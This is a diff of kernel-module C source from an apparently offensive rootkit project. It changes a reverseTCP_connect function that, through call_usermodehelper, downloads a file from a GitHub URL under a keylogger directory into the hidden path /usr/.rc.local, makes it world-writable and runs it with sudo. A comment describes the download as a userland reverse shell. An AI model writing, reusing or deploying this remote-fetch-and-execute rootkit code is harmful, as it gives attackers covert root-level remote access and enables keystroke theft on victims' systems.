@@ -163,7 +163,7 @@ static int reverseTCP_connect(void)
 {
 	struct subprocess_info *sub_info;
 	//download userland reverseshell
-	static  char *argv[] = { "/bin/sh", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/blob/version2/src/keylogger/reverseTCP-user.c;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
+	static  char *argv[] = { "/bin/sh", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/blob/version2/src/keylogger/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
     static  char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
     
 	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL );
